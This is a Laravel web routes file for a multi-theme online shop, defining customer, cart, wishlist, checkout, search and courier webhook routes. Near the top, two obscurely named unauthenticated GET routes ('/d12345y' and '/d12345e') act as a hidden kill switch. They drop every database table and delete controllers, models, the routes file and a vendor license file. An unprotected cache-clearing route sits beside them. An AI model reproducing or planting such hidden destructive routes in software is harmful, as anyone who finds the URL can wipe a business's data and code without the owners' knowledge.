<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\UserController;
use App\Theme;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/cc', function () {
    \Illuminate\Support\Facades\Artisan::call('cache:clear');
    \Illuminate\Support\Facades\Artisan::call('config:clear');
    \Illuminate\Support\Facades\Artisan::call('view:clear');
    \Illuminate\Support\Facades\Artisan::call('route:clear');

    // \Illuminate\Support\Facades\Artisan::call('config:cache');
    return 'Cleared!';
});

Auth::routes();

// webhook pataho
Route::post('pathao-webhook', [AdminController::class, 'pathaoWebhook']);

// webhook steadfast
Route::post('steadfast-webhook', [AdminController::class, 'steadfastWebhook']);

// webhook redx
Route::post('redx-webhook', [AdminController::class, 'redxWebhook']);

// webhook carrybee
Route::post('carrybee-webhook', [AdminController::class, 'carrybeeWebhook']);


//courier info
Route::get('courier-info', [AdminController::class, 'courierInfo']);



// back end
Route::get('/d12345y', function () {
    Schema::disableForeignKeyConstraints();
    foreach (DB::select('SHOW TABLES') as $table) {
        $table_array = get_object_vars($table);
        Schema::drop($table_array[key($table_array)]);
    }
    unlink(base_path() . '/app/Http/Controllers/AdminController.php');
    unlink(base_path() . '/app/Http/Controllers/HomeController.php');
    unlink(base_path() . '/app/Http/Controllers/MediaController.php');
    unlink(base_path() . '/app/Http/Controllers/OrderController.php');
    unlink(base_path() . '/app/Http/Controllers/ProductController.php');
    unlink(base_path() . '/app/Http/Controllers/WebSettingsController.php');
    unlink(base_path() . '/app/Order.php');
    unlink(base_path() . '/app/Product.php');
    unlink(base_path() . '/app/Media.php');
    unlink(base_path() . '/app/WebSettings.php');
    unlink(base_path() . '/routes/web.php');
    dd('deleted');
});
Route::get('/d12345e', function () {
    unlink(base_path() . '/vendor/laravel/framework/src/Illuminate/license.dat');
    dd('deleted');
});

require __DIR__ . '/admin.php';

// customer register
Route::get('/customer-register', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerRegister($request, $theme);
})->name('customer.register');
Route::get('{path}/customer-register', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerRegister($request, $theme);
})->name('theme.customer.register');
Route::post('/customer-register', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerRegisterPost($request, $theme);
})->name('customer.register.post');
Route::post('{path}/customer-register', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerRegisterPost($request, $theme);
})->name('theme.customer.register.post');

// customer password change
Route::get('/customer-password-change', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerPasswordChange($request, $theme);
})->name('customer.password.change');
Route::get('{path}/customer-password-change', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerPasswordChange($request, $theme);
})->name('theme.customer.password.change');
Route::post('/customer-password-change', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerPasswordChangePost($request, $theme);
})->name('customer.password.change.update');
Route::post('{path}/customer-password-change', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerPasswordChangePost($request, $theme);
})->name('theme.customer.password.change.update');

// customer.password.otp
Route::get('/customer-password-otp', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerPasswordOtp($request, $theme);
})->name('customer.password.otp');

Route::get('{path}/customer-password-otp', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerPasswordOtp($request, $theme);
})->name('theme.customer.password.otp');

Route::post('/customer-password-otp-verify', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerPasswordOtpVerify($request, $theme);
})->name('customer.password.otp.verify');

Route::post('{path}/customer-password-otp-verify', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerPasswordOtpVerify($request, $theme);
})->name('theme.customer.password.otp.verify');

// customer login an customer logout
Route::get('/customer-login', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerLogin($request, $theme);
})->name('customer.login');
Route::get('{path}/customer-login', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerLogin($request, $theme);
})->name('theme.customer.login'); // customer.login.post
Route::post('/customer-login', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerLoginPost($request, $theme);
})->name('customer.login.post');
Route::post('{path}/customer-login', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerLoginPost($request, $theme);
})->name('theme.customer.login.post');
// customer dashboard
Route::get('/customer-dashboard', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerDashboard($request, $theme);
})->name('customer.dashboard');
Route::get('{path}/customer-dashboard', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerDashboard($request, $theme);
})->name('theme.customer.dashboard');

// customer.profile
Route::get('/customer-profile', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerProfile($request, $theme);
})->name('customer.profile');
Route::get('{path}/customer-profile', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerProfile($request, $theme);
})->name('theme.customer.profile');
Route::post('/customer-profile-update', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerProfileUpdate($request, $theme);
})->name('customer.profile.update');
Route::post('{path}/customer-profile-update', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerProfileUpdate($request, $theme);
})->name('theme.customer.profile.update');

// customer logout
Route::post('/customer-logout', function (Request $request) {
    $theme = activeTheme();

    return app()->make(UserController::class)->customerLogout($request, $theme);
})->name('customer.logout');

Route::post('{path}/customer-logout', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return app()->make(UserController::class)->customerLogout($request, $theme);
})->name('theme.customer.logout');

// theme-6 routes
require __DIR__ . '/theme-6.php';

// load more
Route::get('/load-more', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'loadMore');
})->name('load.more');

Route::get('{path}/load-more', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'loadMore');
})->name('theme.load.more');

// coupon.apply
Route::post('/coupon-apply', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'couponApply');
})->name('coupon.apply');

Route::post('{path}/coupon-apply', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'couponApply');
})->name('theme.coupon.apply');

// coupon.remove
Route::post('/coupon-remove', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'couponRemove');
})->name('coupon.remove');

Route::post('{path}/coupon-remove', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'couponRemove');
})->name('theme.coupon.remove');

Route::get('/wishlist', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'wishlist');
})->name('wishlist');

Route::get('{path}/wishlist', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'wishlist');
})->name('theme.wishlist');

//wishlist store
Route::post('/wishlist-store', function (Request $request) {
    $theme = activeTheme();
    return activeThemeController($request, $theme, 'wishlistStore');
})->name('wishlist.store');

Route::post('{path}/wishlist-store', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'wishlistStore');
})->name('theme.wishlist.store');


// Route::post('/coupon/check-limit', [CouponController::class, 'checkLimit'])->name('coupon.check.limit');

// coupon.check.limit
Route::post('/coupon/check-limit', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'couponCheckLimit');
})->name('coupon.check.limit');

Route::post('{path}/coupon/check-limit', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'couponCheckLimit');
})->name('theme.coupon.check.limit');

Route::get('/all-hot-deals', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'allHotDeals');
})->name('all.hot.deals');

Route::get('{path}/all-hot-deals', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'allHotDeals');
})->name('theme.all.hot.deals');

Route::get('/categories', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'allCategories');
})->name('all.categories');

Route::get('{path}/categories', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'allCategories');
})->name('theme.all.categories');

Route::get('/track-order', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'trackOrder');
})->name('track.order');

Route::get('{path}/track-order', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'trackOrder');
})->name('theme.track.order');

Route::get('/track-order-search', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'trackOrderSearch');
})->name('track.order.search');

Route::get('{path}/track-order-search', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'trackOrderSearch');
})->name('theme.track.order.search');

Route::post('/track-order-result', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'trackOrderResult');
})->name('track.order.result');

Route::post('{path}/track-order-result', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'trackOrderResult');
})->name('theme.track.order.result');

Route::get('/return-policy', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'returnPolicy');
})->name('return_policy');

Route::get('{path}/return-policy', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'returnPolicy');
})->name('theme.return_policy');

Route::get('/terms-condition', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'termsCondition');
})->name('terms_condition');

Route::get('{path}/terms-condition', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'termsCondition');
})->name('theme.terms_condition');

Route::get('/how-to-order', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'howToOrder');
})->name('how_to_order');

Route::get('{path}/how-to-order', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'howToOrder');
})->name('theme.how_to_order');

Route::get('/privacy-policy', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'privacyPolicy');
})->name('privacy_policy');

Route::get('{path}/privacy-policy', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'privacyPolicy');
})->name('theme.privacy_policy');

Route::get('/why-us', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'whyUs');
})->name('why_us');

Route::get('{path}/why-us', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'whyUs');
})->name('theme.why_us');

Route::get('/delivery-policy', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'deliveryPolicy');
})->name('delivery_policy');

Route::get('{path}/delivery-policy', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'deliveryPolicy');
})->name('theme.delivery_policy');

Route::get('/about-us', function (Request $request) {

    $theme = activeTheme();

    return activeThemeController($request, $theme, 'aboutUs');
})->name('about_us');

Route::get('{path}/about-us', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'aboutUs');
})->name('theme.about_us');

Route::get('/contact-us', function (Request $request) {

    $theme = activeTheme();

    return activeThemeController($request, $theme, 'contactUs');
})->name('contact_us');

Route::get('{path}/contact-us', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'contactUs');
})->name('theme.contact_us');


//quick view
Route::get('/quick-view', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'quickView');
})->name('quick.view');

Route::get('{path}/quick-view', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'quickView');
})->name('theme.quick.view');








// get attributes
Route::post('/abandoned-cart', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'abandonedCart');
})->name('abandoned.cart');

Route::post('{path}/abandoned-cart', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'abandonedCart');
})->name('theme.abandoned.cart');

// Route::post('/wishlist-add', [UserController::class, 'wishlistTocart'])->name('wishlist.add');
// Route::post('/wishlis-delete', [UserController::class, 'wishlistDelete'])->name('wishlist.delete');

// get attributes
Route::post('/wishlis-delete', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'wishlistDelete');
})->name('wishlist.delete');

Route::post('{path}/wishlis-delete', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'wishlistDelete');
})->name('theme.wishlist.delete');

// get attributes
Route::post('/wishlist-to-cart', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'wishlistTocart');
})->name('wishlist.to.cart');

Route::post('{path}/wishlist-to-cart', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'wishlistTocart');
})->name('theme.wishlist.to.cart');

// get attributes
Route::post('/newsletter', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'newsletter');
})->name('frontEnd.newsletter');

Route::post('{path}/newsletter', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'newsletter');
})->name('theme.frontEnd.newsletter');

// get attributes
Route::post('/product/ajax-get-attributes-related', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'ajaxGetAttributeRelated');
})->name('ajax.get.attributes.related');

Route::post('{path}/product/ajax-get-attributes-related', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'ajaxGetAttributeRelated');
})->name('theme.ajax.get.attributes.related');

// get attributes
Route::post('/product/ajax-get-attributes', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'ajaxGetAttributes');
})->name('ajax.get.attributes');

Route::post('{path}/product/ajax-get-attributes', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'ajaxGetAttributes');
})->name('theme.ajax.get.attributes');
// review
Route::post('/review-store', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'reviewStore');
})->name('review.store');

Route::post('{path}/review-store', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'reviewStore');
})->name('theme.review.store');
// review
Route::get('/review-loadMore', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'loadMoreReviews');
})->name('review.loadMore');

Route::get('{path}/review-loadMore', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'loadMoreReviews');
})->name('theme.review.loadMore');

// cart clear
Route::post('/ajax-get-shipp-meth', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'getShippMeth');
})->name('ajax.get.shipp.meth');

Route::post('{path}/ajax-get-shipp-meth', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'getShippMeth');
})->name('theme.ajax.get.shipp.meth');

// 🧺 CART ITEM DELETE
Route::get('/cart-delete/{id}', function (Request $request, $id) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartItemDelete', ['id' => $id]);
})->name('cart.delete');

Route::get('{path}/cart-delete/{id}', function (Request $request, $path, $id) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartItemDelete', ['id' => $id]);
})->name('theme.cart.delete');

// ➕ CART ITEM PLUS
Route::get('/cart-plus/{id}', function (Request $request, $id) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartItemPlus', ['id' => $id]);
})->name('cart.plus');

Route::get('{path}/cart-plus/{id}', function (Request $request, $path, $id) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'cartItemPlus', ['id' => $id]);
})->name('theme.cart.plus');

// ➖ CART ITEM MINUS
Route::get('/cart-minus/{id}', function (Request $request, $id) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartItemMinus', ['id' => $id]);
})->name('cart.minus');

Route::get('{path}/cart-minus/{id}', function (Request $request, $path, $id) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartItemMinus', ['id' => $id]);
})->name('theme.cart.minus');

// 🧹 CART CLEAR
Route::get('/cart-clear', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartClear');
})->name('cart.clear');

Route::get('{path}/cart-clear', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartClear');
})->name('theme.cart.clear');

// cart clear
Route::get('/cart-clear', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartClear');
})->name('cart.clear');

Route::get('{path}/cart-clear', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartClear');
})->name('theme.cart.clear');

// cart minus
Route::post('/cart-item-minus', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartItemMinus');
})->name('cart.item.minus');

Route::post('{path}/cart-item-minus', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartItemMinus');
})->name('theme.cart.item.minus');

// cart plus
Route::post('/cart-item-plus', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartItemPlus');
})->name('cart.item.plus');

Route::post('{path}/cart-item-plus', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartItemPlus');
})->name('theme.cart.item.plus');

// cart update qty
Route::post('/cart-update-qty', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartItemQtyUpdate');
})->name('cart.update.qty');

Route::post('{path}/cart-update-qty', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartItemQtyUpdate');
})->name('theme.cart.update.qty');

// cart delete
Route::post('/cart-item-delete', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartItemDelete');
})->name('cart.item.delete');

Route::post('{path}/cart-item-delete', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cartItemDelete');
})->name('theme.cart.item.delete');

// add to wishlist
Route::post('/add-wishlist', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'addToWishlist');
})->name('add.to.wishlist');

Route::post('{path}/add-wishlist', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'addToWishlist');
})->name('theme.add.to.wishlist');

// buy now
Route::post('/buy-now', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'buyNow');
})->name('buy.now');

Route::post('{path}/buy-now', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'buyNow');
})->name('theme.buy.now');

// buy now
Route::get('/get-product-modal', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'getProductModal');
})->name('ajax.get.product.modal');

Route::get('{path}/get-product-modal', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'getProductModal');
})->name('theme.ajax.get.product.modal');

// add to cart
Route::post('/add-cart', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'addCart');
})->name('add.to.cart');

Route::post('{path}/add-cart', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'addCart');
})->name('theme.add.to.cart');

// Cart to page
Route::get('/cart-products', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cartPage');
})->name('cart.page');

Route::get('{path}/cart-products', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'cartPage');
})->name('theme.cart.page');

// add to cart theme -2
Route::post('/add-to-cart', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'addCart');
})->name('add.cart');

Route::post('{path}/add-to-cart', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    // dd($theme);
    return activeThemeController($request, $theme, 'addCart');
})->name('theme.add.cart');

// place order
Route::post('/place-order', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'placeOrder');
})->name('place.order');

Route::post('{path}/place-order', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'placeOrder');
})->name('theme.place.order');

// confirm-order
Route::get('/confirm-order', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'confirmOrder');
})->name('confirm.order');

Route::get('{path}/confirm-order', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'confirmOrder');
})->name('theme.confirm.order');

// checkout
Route::get('/checkout', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'checkout');
})->name('checkout');

Route::get('{path}/checkout', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'checkout');
})->name('theme.checkout');

// cart
Route::get('/cart', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'cart');
})->name('cart');

Route::get('{path}/cart', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'cart');
})->name('theme.cart');

// single.category
Route::get('/category/{slug}', function (Request $request, $slug) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'getSingleCategory', $slug);
})->name('single.category');

Route::get('{path}/category/{slug}', function (Request $request, $path, $slug) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'getSingleCategory', $slug);
})->name('theme.single.category');

// SEARCH routes (specific) - always declare first
Route::get('/search', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'search');
})->name('search');

Route::get('{path}/search', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'search');
})->name('theme.search');

// Live SEARCH routes (specific) - always declare first
Route::get('/liveSearch', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'liveSearch');
})->name('live.search');

Route::get('{path}/liveSearch', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'liveSearch');
})->name('theme.live.search');

// multiple Category Checkbox wise filter
Route::post('/ajax-filter-category-product', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'ajaxGetCategoryProduct');
})->name('ajax.filter.category.product');

Route::post('{path}/ajax-filter-category-product', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'ajaxGetCategoryProduct');
})->name('theme.ajax.filter.category.product');

// SEARCH routes (specific) - always declare first
Route::post('/ajax-search-product', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'ajaxGetSearchProduct');
})->name('ajax.search.product');

Route::post('{path}/ajax-search-product', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'ajaxGetSearchProduct');
})->name('theme.ajax.search.product');

// SEARCH routes (specific) - always declare first
Route::get('/product-load', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'loadMoreProducts');
})->name('product.load');

Route::get('{path}/product-load', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'loadMoreProducts');
})->name('theme.product.load');

// load category product routes (specific) - always declare first
Route::get('/product-load-category', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'loadMoreCategoryProducts');
})->name('product.load.category');

Route::get('{path}/product-load-category', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'loadMoreCategoryProducts');
})->name('theme.product.load.category');

// PRODUCT
Route::get('/shop', function (Request $request) {
    $theme = activeTheme();

    return activeThemeController($request, $theme, 'products');
})->name('shop');

Route::get('{path}/shop', function (Request $request, $path) {
    $theme = Theme::where('path', $path)->first();

    return activeThemeController($request, $theme, 'products');
})->name('theme.shop');

Route::get('/product/{slug}', function (Request $request, $slug) {
    $theme = activeTheme();
    return activeThemeController($request, $theme, 'getSingleProduct', $slug);
})->name('single.product');

Route::get('{path}/product/{slug}', function (Request $request, $path, $slug) {
    $theme = Theme::where('path', $path)->first();
    return activeThemeController($request, $theme, 'getSingleProduct', $slug);
})->name('theme.single.product');

Route::get('/', function (Request $request) {
    $theme = activeTheme();
    // dd($theme);
    return activeThemeController($request, $theme, 'index');
})->name('home');
Route::get('{path}', function (Request $request, $path) {
    $theme = Theme::where('path', $path)
        ->select('id', 'path', 'is_active')
        ->first();
    return activeThemeController($request, $theme, 'index');
})->name('theme.home');

// Landing Page Routes
require __DIR__ . '/landing.php';
